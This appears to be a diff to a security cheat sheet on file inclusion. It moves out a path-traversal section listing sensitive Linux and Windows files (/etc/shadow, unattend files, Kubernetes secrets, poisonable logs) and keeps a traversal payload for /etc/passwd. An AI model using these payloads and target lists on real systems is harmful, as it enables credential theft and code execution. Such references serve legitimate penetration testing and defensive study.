@@ -1,4 +1,4 @@
-# File Inclusion - Path Traversal
+# File Inclusion
 
 The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
 
@@ -6,7 +6,6 @@ The Path Traversal vulnerability allows an attacker to access a file, usually ex
 
 ## Summary
 
-* [Path Traversal](#path-traversal)
 * [Basic LFI](#basic-lfi)
 * [Basic RFI](#basic-rfi)
 * [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
@@ -24,77 +23,9 @@ The Path Traversal vulnerability allows an attacker to access a file, usually ex
 * [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
 * [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
 
-
-## Path Traversal
-
-Linux - Interesting files to check out :
-
-```powershell
-/etc/issue
-/etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/motd
-/etc/mysql/my.cnf
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
-/proc/self/environ
-/proc/version
-/proc/cmdline
-/proc/sched_debug
-/proc/mounts
-/proc/net/arp
-/proc/net/route
-/proc/net/tcp
-/proc/net/udp
-```
-
-Windows - Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
-
-```powershell
-c:/boot.ini
-c:/inetpub/logs/logfiles
-c:/inetpub/wwwroot/global.asa
-c:/inetpub/wwwroot/index.asp
-c:/inetpub/wwwroot/web.config
-c:/sysprep.inf
-c:/sysprep.xml
-c:/sysprep/sysprep.inf
-c:/sysprep/sysprep.xml
-c:/system32/inetsrv/metabase.xml
-c:/sysprep.inf
-c:/sysprep.xml
-c:/sysprep/sysprep.inf
-c:/sysprep/sysprep.xml
-c:/system volume information/wpsettings.dat
-c:/system32/inetsrv/metabase.xml
-c:/unattend.txt
-c:/unattend.xml
-c:/unattended.txt
-c:/unattended.xml
-```
-
-The following log files are controllable and can be included with an evil payload to achieve a command execution
-
-```powershell
-/var/log/apache/access.log
-/var/log/apache/error.log
-/var/log/httpd/error_log
-/usr/local/apache/log/error_log
-/usr/local/apache2/log/error_log
-/var/log/vsftpd.log
-/var/log/sshd.log
-/var/log/mail
-```
-
-Other easy win files.
-
-```powershell
-/home/$USER/.bash_history
-/var/run/secrets/kubernetes.io/serviceaccount
-```
-
 ## Basic LFI
+
+In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd
